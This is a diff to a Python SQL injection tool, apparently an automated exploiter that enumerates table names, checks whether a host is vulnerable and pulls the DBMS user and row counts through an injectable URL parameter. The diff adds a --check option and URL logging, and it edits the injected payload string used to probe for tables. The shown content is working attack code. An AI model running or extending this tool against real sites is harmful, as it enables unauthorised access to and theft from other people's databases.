@@ -20,6 +20,7 @@ def send_HTTP_request(url, params):
     headers = {'cookie': COOKIE}
 
     url = url + '?' + urllib.urlencode(params)
+    display_message("URL : " + url)
     req = requests.get(url, headers=headers)
     return req
 
@@ -67,7 +68,7 @@ def find_tables(url, params, param_to_test, file_table):
         find_table(url, params, param_to_test, table)
 
 def find_table(url, params, param_to_test, table_name):
-    params[param_to_test] = "'and (select test from " + table_name + " where test = 1) >= 'p' or ''='"
+    params[param_to_test] = "'and (select test from " + table_name + " where test = 1) or ''='"
     req = send_HTTP_request(url, params)
     if (table_exists(req.content)):
         insert_table_name_in_tables(table_name)
@@ -289,6 +290,7 @@ parser.add_option('--C', help='Name of the column you want to get', dest='column
 parser.add_option('--column_name_file', help='Name for columns', dest='file_column', default='db/columns.db')
 
 # Fingerprinting flag
+parser.add_option('--check', help='Check if host is vulnerable', dest='check', default=False, action='store_true')
 parser.add_option('--user', help='Tries to get user() from dbms', dest='user', default=False, action='store_true')
 parser.add_option('--count', help='Get count of specified table(s)', dest='count', default=False, action='store_true')
 
@@ -313,7 +315,10 @@ else:
         raise Exception('Param not in URL!')
 
     url = opts.url.split('?')[0]
-    check_if_host_vulnerable(url, params, opts.param)
+
+    # --check flag
+    if (opts.check):
+        check_if_host_vulnerable(url, params, opts.param)
 
     # --tables flag
     if (opts.tables):
